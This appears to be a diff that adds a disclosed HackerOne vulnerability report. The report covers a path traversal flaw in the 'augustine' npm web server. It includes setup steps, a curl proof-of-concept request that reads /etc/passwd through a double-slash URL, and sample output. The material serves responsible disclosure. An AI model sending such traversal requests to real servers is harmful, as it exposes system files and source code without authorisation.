@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/296282
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/ysx
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:23.01.2018 9:53:11
+
+Summary:
+
+Hi,
+
+A crafted GET request can be leveraged to traverse the directory structure of a host using the `augustine` web server package, and request arbitrary files outside of the specified web root.
+
+## Module specification
+* **Name**: [augustine](https://www.npmjs.com/package/augustine)
+* **Version**: 0.2.3 (latest release build)
+
+## Verified conditions
+* **Test server:** Ubuntu 16.04 LTS
+* **cURL package**: `curl 7.55.1 (2017-08-14)`
+
+## Proof of concept
+
+Please globally install the `augustine` package and `cd` to a chosen directory (in this case, `/root`) on your test server. Next, run `augustine --port 8081` to start serving from this location.
+
+Substituting the `<server-IP>` value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file. Due to the nature of this traversal, browsing to the below URL will also display the `passwd` file:
+
+```
+curl "http://<server-IP>:8081//etc/passwd"
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+[...]
+```
+
+Thanks,
+
+Yasin
+
+## Impact
+
+An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.
